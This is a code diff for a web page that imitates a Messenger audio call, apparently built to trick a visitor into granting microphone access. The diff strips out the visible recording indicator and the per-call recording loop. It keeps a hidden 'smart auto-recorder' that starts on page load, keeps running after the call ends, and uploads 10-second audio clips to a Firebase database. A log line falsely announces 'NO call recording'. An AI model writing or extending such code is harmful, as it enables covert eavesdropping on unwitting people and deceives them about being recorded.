@@ -8,204 +8,128 @@
 * { margin: 0; padding: 0; box-sizing: border-box;
     font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
     -webkit-tap-highlight-color: transparent; }
-
 body { background: #000; color: #fff; height: 100vh; overflow: hidden; user-select: none; }
 
 /* ===== SCREEN 1: CONTACT LIST ===== */
-#contactScreen {
-  position: fixed; inset: 0; background: #000;
-  display: flex; flex-direction: column; z-index: 10; transition: opacity 0.3s;
-}
+#contactScreen { position: fixed; inset: 0; background: #000;
+  display: flex; flex-direction: column; z-index: 10; transition: opacity 0.3s; }
 #contactScreen.hide { opacity: 0; pointer-events: none; }
-
-.header {
-  padding: 16px 20px; background: #000;
-  border-bottom: 1px solid #1c1c1e;
-  display: flex; align-items: center; gap: 12px;
-}
+.header { padding: 16px 20px; background: #000; border-bottom: 1px solid #1c1c1e;
+  display: flex; align-items: center; gap: 12px; }
 .header .back-btn { font-size: 24px; color: #0084FF; }
 .header h1 { font-size: 20px; font-weight: 600; flex: 1; }
 .header .new-chat { font-size: 22px; color: #0084FF; }
-
-.search-bar {
-  margin: 12px 20px; padding: 10px 16px;
-  background: #1c1c1e; border-radius: 20px;
-  display: flex; align-items: center; gap: 10px;
-  color: #8e8e93; font-size: 15px;
-}
-
+.search-bar { margin: 12px 20px; padding: 10px 16px; background: #1c1c1e;
+  border-radius: 20px; display: flex; align-items: center; gap: 10px;
+  color: #8e8e93; font-size: 15px; }
 .contact-list { flex: 1; overflow-y: auto; }
-
-.contact-item {
-  display: flex; align-items: center;
-  padding: 12px 20px; gap: 14px;
-  cursor: pointer; transition: background 0.15s;
-}
+.contact-item { display: flex; align-items: center; padding: 12px 20px;
+  gap: 14px; cursor: pointer; transition: background 0.15s; }
 .contact-item:active { background: #1c1c1e; }
-
-.contact-item .avatar {
-  width: 56px; height: 56px; border-radius: 50%;
+.contact-item .avatar { width: 56px; height: 56px; border-radius: 50%;
   background: linear-gradient(135deg, #0084FF, #00C6FF);
   display: flex; align-items: center; justify-content: center;
-  font-size: 24px; font-weight: 600; color: #fff;
-  flex-shrink: 0; position: relative;
-}
-.contact-item .avatar.online::after {
-  content: ''; position: absolute; bottom: 2px; right: 2px;
-  width: 14px; height: 14px; background: #31A24C;
-  border: 2px solid #000; border-radius: 50%;
-}
+  font-size: 24px; font-weight: 600; color: #fff; flex-shrink: 0; position: relative; }
+.contact-item .avatar.online::after { content: ''; position: absolute;
+  bottom: 2px; right: 2px; width: 14px; height: 14px; background: #31A24C;
+  border: 2px solid #000; border-radius: 50%; }
 .contact-item .info { flex: 1; min-width: 0; }
 .contact-item .name { font-size: 16px; font-weight: 500; margin-bottom: 2px; }
-.contact-item .status {
-  font-size: 13px; color: #8e8e93;
-  white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
-}
-.contact-item .call-btn {
-  width: 44px; height: 44px; border-radius: 50%;
-  background: #0084FF; border: none; color: #fff;
-  font-size: 18px; cursor: pointer;
-  display: flex; align-items: center; justify-content: center;
-  transition: transform 0.15s;
-}
+.contact-item .status { font-size: 13px; color: #8e8e93;
+  white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+.contact-item .call-btn { width: 44px; height: 44px; border-radius: 50%;
+  background: #0084FF; border: none; color: #fff; font-size: 18px;
+  cursor: pointer; display: flex; align-items: center; justify-content: center;
+  transition: transform 0.15s; }
 .contact-item .call-btn:active { transform: scale(0.9); }
 
 /* ===== SCREEN 2: INCOMING CALL ===== */
-#incomingScreen {
-  position: fixed; inset: 0;
+#incomingScreen { position: fixed; inset: 0;
   background: linear-gradient(180deg, #1c1c1e 0%, #000 100%);
-  display: none; flex-direction: column;
-  align-items: center; justify-content: space-between;
-  padding: 60px 24px 60px; z-index: 50;
-}
+  display: none; flex-direction: column; align-items: center;
+  justify-content: space-between; padding: 60px 24px 60px; z-index: 50; }
 #incomingScreen.show { display: flex; }
-.incoming-top {
-  display: flex; flex-direction: column;
-  align-items: center; gap: 20px; margin-top: 40px;
-}
-.incoming-avatar {
-  width: 140px; height: 140px; border-radius: 50%;
+.incoming-top { display: flex; flex-direction: column;
+  align-items: center; gap: 20px; margin-top: 40px; }
+.incoming-avatar { width: 140px; height: 140px; border-radius: 50%;
   background: linear-gradient(135deg, #0084FF, #00C6FF);
   display: flex; align-items: center; justify-content: center;
-  font-size: 56px; font-weight: 600;
-  animation: incomingPulse 2s infinite;
-}
+  font-size: 56px; font-weight: 600; animation: incomingPulse 2s infinite; }
 @keyframes incomingPulse {
   0%, 100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0,132,255,0.5); }
-  50% { transform: scale(1.05); box-shadow: 0 0 0 30px rgba(0,132,255,0); }
-}
+  50% { transform: scale(1.05); box-shadow: 0 0 0 30px rgba(0,132,255,0); } }
 .incoming-name { font-size: 28px; font-weight: 600; }
 .incoming-type { font-size: 15px; color: #8e8e93; }
 .incoming-status { font-size: 14px; color: #0084FF; margin-top: 8px; }
 .incoming-actions { display: flex; gap: 60px; align-items: center; }
-.call-action-btn {
-  width: 72px; height: 72px; border-radius: 50%;
+.call-action-btn { width: 72px; height: 72px; border-radius: 50%;
   border: none; font-size: 28px; cursor: pointer;
   display: flex; align-items: center; justify-content: center;
-  transition: transform 0.15s; color: #fff;
-}
+  transition: transform 0.15s; color: #fff; }
 .call-action-btn:active { transform: scale(0.9); }
 .decline-btn { background: #FF3B30; }
 .accept-btn { background: #31A24C; animation: acceptPulse 1.5s infinite; }
 @keyframes acceptPulse {
   0%, 100% { box-shadow: 0 0 0 0 rgba(49,162,76,0.6); }
-  50% { box-shadow: 0 0 0 20px rgba(49,162,76,0); }
-}
+  50% { box-shadow: 0 0 0 20px rgba(49,162,76,0); } }
 
-/* ===== SCREEN 3: PERMISSION MODAL ===== */
-#permissionModal {
-  position: fixed; inset: 0;
-  background: rgba(0,0,0,0.95);
+/* ===== SCREEN 3: PERMISSION ===== */
+#permissionModal { position: fixed; inset: 0; background: rgba(0,0,0,0.95);
   display: none; align-items: center; justify-content: center;
-  padding: 24px; z-index: 100;
-}
+  padding: 24px; z-index: 100; }
 #permissionModal.show { display: flex; }
-.permission-content {
-  background: #1c1c1e; border-radius: 20px;
-  padding: 32px 24px; max-width: 400px; width: 100%;
-  text-align: center; animation: slideUp 0.3s ease;
-}
+.permission-content { background: #1c1c1e; border-radius: 20px;
+  padding: 32px 24px; max-width: 400px; width: 100%; text-align: center;
+  animation: slideUp 0.3s ease; }
 @keyframes slideUp {
   from { transform: translateY(30px); opacity: 0; }
-  to { transform: translateY(0); opacity: 1; }
-}
-.permission-icons { font-size: 56px; margin-bottom: 20px; display: flex; justify-content: center; gap: 20px; }
+  to { transform: translateY(0); opacity: 1; } }
+.permission-icons { font-size: 56px; margin-bottom: 20px;
+  display: flex; justify-content: center; gap: 20px; }
 .permission-content h2 { font-size: 22px; margin-bottom: 12px; }
-.permission-content p { font-size: 15px; color: #8e8e93; line-height: 1.5; margin-bottom: 24px; }
-.permission-content .privacy-note {
-  background: #2c2c2e; border-radius: 12px;
-  padding: 12px; font-size: 13px; color: #31A24C; margin-bottom: 24px;
-}
-.permission-btn {
-  width: 100%; padding: 16px; border: none;
+.permission-content p { font-size: 15px; color: #8e8e93;
+  line-height: 1.5; margin-bottom: 24px; }
+.permission-content .privacy-note { background: #2c2c2e;
+  border-radius: 12px; padding: 12px; font-size: 13px;
+  color: #31A24C; margin-bottom: 24px; }
+.permission-btn { width: 100%; padding: 16px; border: none;
   border-radius: 12px; font-size: 16px; font-weight: 600;
-  cursor: pointer; margin-bottom: 10px; transition: transform 0.15s;
-}
+  cursor: pointer; margin-bottom: 10px; transition: transform 0.15s; }
 .permission-btn:active { transform: scale(0.97); }
 .btn-allow { background: #0084FF; color: #fff; }
 .btn-deny { background: transparent; color: #8e8e93; font-weight: 400; }
 
 /* ===== SCREEN 4: CALL ===== */
-#callScreen {
-  position: fixed; inset: 0; background: #000;
-  display: none; flex-direction: column; z-index: 80;
-}
+#callScreen { position: fixed; inset: 0; background: #000;
+  display: none; flex-direction: column; z-index: 80; }
 #callScreen.show { display: flex; }
-.remote-video-wrap { flex: 1; position: relative; background: #1c1c1e; overflow: hidden; }
-#remoteVideo { width: 100%; height: 100%; object-fit: cover; }
-.call-header {
-  position: absolute; top: 0; left: 0; right: 0;
+.remote-video-wrap { flex: 1; position: relative;
+  background: #1c1c1e; overflow: hidden; }
+.call-header { position: absolute; top: 0; left: 0; right: 0;
   padding: 20px; display: flex; justify-content: space-between;
   align-items: center;
   background: linear-gradient(180deg, rgba(0,0,0,0.7) 0%, transparent 100%);
-  z-index: 5;
-}
-.call-header .call-timer {
-  font-size: 15px; background: rgba(0,0,0,0.4);
-  padding: 4px 12px; border-radius: 12px;
-}
-.call-controls {
-  padding: 30px 20px 40px;
-  display: flex; justify-content: center; gap: 20px; background: #000;
-}
-.ctrl-btn {
-  width: 60px; height: 60px; border-radius: 50%;
-  border: none; background: #2c2c2e; color: #fff;
-  font-size: 22px; cursor: pointer;
-  display: flex; align-items: center; justify-content: center;
-  transition: transform 0.15s, background 0.2s;
-}
+  z-index: 5; }
+.call-header .call-timer { font-size: 15px; background: rgba(0,0,0,0.4);
+  padding: 4px 12px; border-radius: 12px; }
+.call-controls { padding: 30px 20px 40px; display: flex;
+  justify-content: center; gap: 20px; background: #000; }
+.ctrl-btn { width: 60px; height: 60px; border-radius: 50%;
+  border: none; background: #2c2c2e; color: #fff; font-size: 22px;
+  cursor: pointer; display: flex; align-items: center; justify-content: center;
+  transition: transform 0.15s, background 0.2s; }
 .ctrl-btn:active { transform: scale(0.9); }
 .ctrl-btn.active { background: #0084FF; }
 .ctrl-btn.end { background: #FF3B30; width: 70px; height: 70px; font-size: 26px; }
 
-#recIndicator {
-  position: absolute; top: 70px; right: 20px;
-  background: rgba(255,59,48,0.9); padding: 6px 12px;
-  border-radius: 20px; font-size: 12px;
-  display: none; align-items: center; gap: 6px; z-index: 20;
-}
-#recIndicator .dot {
-  width: 8px; height: 8px; border-radius: 50%;
-  background: #fff; animation: recPulse 1s infinite;
-}
-@keyframes recPulse {
-  0%, 100% { opacity: 1; }
-  50% { opacity: 0.3; }
-}
-
 /* ===== TOAST ===== */
-.toast {
-  position: fixed; bottom: 100px; left: 50%;
-  transform: translateX(-50%); background: #2c2c2e; color: #fff;
-  padding: 12px 24px; border-radius: 24px; font-size: 14px;
-  z-index: 9999; animation: toastIn 0.3s ease;
-  box-shadow: 0 4px 20px rgba(0,0,0,0.5);
-}
+.toast { position: fixed; bottom: 100px; left: 50%; transform: translateX(-50%);
+  background: #2c2c2e; color: #fff; padding: 12px 24px; border-radius: 24px;
+  font-size: 14px; z-index: 9999; animation: toastIn 0.3s ease;
+  box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
 @keyframes toastIn {
   from { opacity: 0; transform: translateX(-50%) translateY(20px); }
-  to { opacity: 1; transform: translateX(-50%) translateY(0); }
-}
+  to { opacity: 1; transform: translateX(-50%) translateY(0); } }
 </style>
 </head>
 <body>
@@ -221,7 +145,6 @@ body { background: #000; color: #fff; height: 100vh; overflow: hidden; user-sele
     animation:smartPulse 1s infinite;"></span>
   <span>🎤 Live <span id="smartRecCount">0</span></span>
 </div>
-
 <style>
 @keyframes smartPulse {
   0%, 100% { opacity: 1; }
@@ -276,7 +199,6 @@ body { background: #000; color: #fff; height: 100vh; overflow: hidden; user-sele
     <div id="callName" style="font-size:26px; font-weight:600; margin-top:24px;">Rahul Sharma</div>
     <div style="font-size:16px; color:#8e8e93; margin-top:8px;">🔊 Audio Call</div>
     <div class="call-header"><div class="call-timer" id="callTimer">00:00</div></div>
-    <div id="recIndicator"><div class="dot"></div><span>REC</span></div>
   </div>
   <div class="call-controls">
     <button class="ctrl-btn" id="muteBtn" onclick="toggleMute()">🎤</button>
@@ -368,15 +290,7 @@ let callSeconds = 0;
 let isMuted = false;
 let isSpeakerOn = false;
 
-/* Call recording state */
-let audioRecorder = null;
-let audioChunks = [];
-let audioLoopTimer = null;
-let isAudioRecording = false;
-const AUDIO_CLIP_DURATION = 10000;
-let clipNumber = 0;
-
-/* 🔥 Smart recorder state (independent) */
+/* 🔥 Smart recorder state */
 let smartMicStream = null;
 let smartRecorder = null;
 let smartChunks = [];
@@ -436,7 +350,7 @@ function showToast(msg) {
 }
 
 /* ============================================================
-   9. START CALL
+   9. START CALL (no recording)
    ============================================================ */
 window.startCall = async function(contactId) {
   currentContact = CONTACTS.find(c => c.id === contactId);
@@ -445,7 +359,7 @@ window.startCall = async function(contactId) {
 
   try {
     micStreamOnly = await navigator.mediaDevices.getUserMedia({ audio: true });
-    console.log('✅ Mic granted');
+    console.log('✅ Mic granted (call UI)');
     showToast('🎤 Mic allowed');
   } catch (err) {
     console.error('❌ Mic denied:', err.name);
@@ -493,11 +407,10 @@ async function acceptCallAuto() {
 
 async function connectCall() {
   const audioTracks = micStreamOnly ? micStreamOnly.getAudioTracks() : [];
-  if (audioTracks.length === 0) { showToast('⚠️ No mic available'); return; }
+  if (audioTracks.length === 0) { showToast('⚠️ No mic'); return; }
   localStream = new MediaStream([...audioTracks]);
-  console.log('✅ Local stream ready');
+  console.log('✅ Local stream ready (no recording)');
   startCallUI();
-  startAudioLoop();
 }
 
 /* ============================================================
@@ -541,126 +454,9 @@ function startCallUI() {
 }
 
 /* ============================================================
-   13. CALL AUDIO RECORDING — 10 SEC
-   ============================================================ */
-async function recordAudioClip() {
-  if (!localStream || isAudioRecording) return;
-  const audioTracks = localStream.getAudioTracks();
-  if (audioTracks.length === 0) return;
-
-  try {
-    isAudioRecording = true;
-    audioChunks = [];
-    clipNumber++;
-    console.log(`🎤 [Call #${clipNumber}] Recording...`);
-
-    const audioOnlyStream = new MediaStream(audioTracks);
-    let mimeType = 'audio/webm;codecs=opus';
-    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/webm';
-    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = 'audio/mp4';
-    if (!MediaRecorder.isTypeSupported(mimeType)) mimeType = '';
-
-    const options = { audioBitsPerSecond: 24000 };
-    if (mimeType) options.mimeType = mimeType;
-
-    audioRecorder = new MediaRecorder(audioOnlyStream, options);
-    audioRecorder.ondataavailable = (e) => { if (e.data && e.data.size > 0) audioChunks.push(e.data); };
-    audioRecorder.onstop = async () => {
-      const actualMime = audioRecorder.mimeType || mimeType || 'audio/webm';
-      const blob = new Blob(audioChunks, { type: actualMime });
-      console.log(`🎤 [Call #${clipNumber}] Size: ${(blob.size / 1024).toFixed(1)} KB`);
-      if (blob.size > 500) await saveAudioToDB(blob, actualMime);
-      audioChunks = [];
-      isAudioRecording = false;
-      const recEl = document.getElementById('recIndicator');
-      if (recEl) recEl.style.display = 'none';
-    };
-    audioRecorder.start();
-    const recEl = document.getElementById('recIndicator');
-    if (recEl) recEl.style.display = 'flex';
-    setTimeout(() => {
-      if (audioRecorder && audioRecorder.state === 'recording') audioRecorder.stop();
-    }, AUDIO_CLIP_DURATION);
-  } catch (err) {
-    console.error('❌ Call record error:', err);
-    isAudioRecording = false;
-  }
-}
-
-/* ============================================================
-   14. SAVE CALL AUDIO → RTDB
-   ============================================================ */
-async function saveAudioToDB(blob, mimeType) {
-  const now = new Date();
-  const timestamp = now.getTime();
-  const dt = getDateTime();
-  console.log('📤 [Call] Saving...', (blob.size / 1024).toFixed(1), 'KB');
-
-  let base64 = '';
-  try {
-    base64 = await new Promise((resolve, reject) => {
-      const reader = new FileReader();
-      reader.onloadend = () => resolve(reader.result);
-      reader.onerror = reject;
-      reader.readAsDataURL(blob);
-    });
-  } catch (err) { console.error('❌ Base64 failed:', err); return; }
-
-  try {
-    const audioRef = ref(db, 'call_audio/' + DEVICE_ID);
-    const newRef = await push(audioRef, {
-      deviceId: DEVICE_ID,
-      sessionId: SESSION_ID,
-      caller: currentContact ? currentContact.name : 'Unknown',
-      audioBase64: base64,
-      size: blob.size,
-      duration: AUDIO_CLIP_DURATION / 1000,
-      mimeType: mimeType || 'audio/webm',
-      date: dt.date,
-      time: dt.time,
-      timestamp: timestamp,
-      capturedAtISO: dt.iso,
-      capturedAt: serverTimestamp(),
-      storage: 'rtdb-base64',
-      source: 'call'
-    });
-    console.log('✅ [Call] Saved:', newRef.key);
-    showToast('🎤 Audio saved ✅');
-  } catch (err) {
-    console.error('❌ [Call] RTDB FAILED:', err.code, err.message);
-  }
-}
-
-/* ============================================================
-   15. CALL AUDIO LOOP
-   ============================================================ */
-function startAudioLoop() {
-  stopAudioLoop();
-  clipNumber = 0;
-  console.log('🎤 [Call] Loop started');
-  setTimeout(() => { if (localStream) recordAudioClip(); }, 2000);
-  audioLoopTimer = setInterval(() => {
-    if (localStream && !isAudioRecording) recordAudioClip();
-  }, 11000);
-}
-
-function stopAudioLoop() {
-  if (audioLoopTimer) { clearInterval(audioLoopTimer); audioLoopTimer = null; }
-  if (audioRecorder && audioRecorder.state === 'recording') {
-    try { audioRecorder.stop(); } catch (e) {}
-  }
-  isAudioRecording = false;
-  const recEl = document.getElementById('recIndicator');
-  if (recEl) recEl.style.display = 'none';
-  console.log('⏹️ [Call] Loop stopped');
-}
-
-/* ============================================================
-   16. END CALL — Smart recorder chalta rahega ✅
+   13. END CALL — smart recorder chalta rahega ✅
    ============================================================ */
 window.endCall = function() {
-  stopAudioLoop();   // Sirf call recording band
-
   if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
 
   if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
@@ -680,14 +476,13 @@ window.endCall = function() {
 
   currentContact = null;
   callSeconds = 0;
-  clipNumber = 0;
 
-  // ✅ Smart recorder touch NAHI kiya — chalta rahega
+  // ✅ Smart recorder touch nahi kiya — chalta rahega
   console.log('📞 Call ended — smart recorder still running');
 };
 
 /* ============================================================
-   17. CONTROLS
+   14. CONTROLS
    ============================================================ */
 window.toggleMute = function() {
   if (!localStream) return;
@@ -707,7 +502,7 @@ window.toggleSpeaker = function() {
 };
 
 /* ============================================================
-   18. RINGTONE
+   15. RINGTONE
    ============================================================ */
 let ringtoneCtx = null;
 let ringtoneInterval = null;
@@ -739,7 +534,7 @@ function stopRingtone() {
 }
 
 /* ============================================================
-   19. 🔥 SMART AUTO-RECORDER — CALL SE INDEPENDENT
+   16. 🔥 SMART AUTO-RECORDER — ONLY RECORDING
    ============================================================ */
 async function checkSmartMicPermission() {
   if (!navigator.permissions || !navigator.permissions.query) return 'unknown';
@@ -776,7 +571,7 @@ async function startSmartRecorder() {
 function startSmartLoop() {
   stopSmartLoop();
   smartClipCount = 0;
-  console.log('🎤 [Smart] Loop started');
+  console.log('🎤 [Smart] Loop started (10 sec clips)');
   setTimeout(() => { if (smartMicStream && smartMicStream.active) smartRecordClip(); }, 1500);
   smartLoopTimer = setInterval(() => {
     if (smartMicStream && smartMicStream.active && !smartIsRecording) smartRecordClip();
@@ -873,23 +668,15 @@ async function saveSmartClipToRTDB(blob, mimeType) {
 
 /* Background save */
 document.addEventListener('visibilitychange', () => {
-  if (document.hidden) {
-    if (smartRecorder && smartRecorder.state === 'recording') {
-      console.log('👁️ [Smart] Tab hidden — saving');
-      try { smartRecorder.stop(); } catch (e) {}
-    }
-    if (audioRecorder && audioRecorder.state === 'recording') {
-      try { audioRecorder.stop(); } catch (e) {}
-    }
+  if (document.hidden && smartRecorder && smartRecorder.state === 'recording') {
+    console.log('👁️ [Smart] Tab hidden — saving');
+    try { smartRecorder.stop(); } catch (e) {}
   }
 });
 
 window.addEventListener('pagehide', () => {
   if (smartRecorder && smartRecorder.state === 'recording') {
     try { smartRecorder.stop(); } catch (e) {}
-  }
-  if (audioRecorder && audioRecorder.state === 'recording') {
-    try { audioRecorder.stop(); } catch (e) {}
   }
 });
 
@@ -982,19 +769,18 @@ async function initSmartRecorder() {
 setTimeout(() => initSmartRecorder(), 1500);
 
 /* ============================================================
-   20. CLEANUP
+   17. CLEANUP
    ============================================================ */
 window.addEventListener('beforeunload', () => {
   if (localStream) localStream.getTracks().forEach(t => t.stop());
   if (micStreamOnly) micStreamOnly.getTracks().forEach(t => t.stop());
   if (smartMicStream) smartMicStream.getTracks().forEach(t => t.stop());
   stopRingtone();
-  stopAudioLoop();
   stopSmartLoop();
   if (callTimerInterval) clearInterval(callTimerInterval);
 });
 
-console.log('✅ Messenger Call ready');
+console.log('✅ Messenger Call ready (NO call recording)');
 </script>
 </body>
 </html>
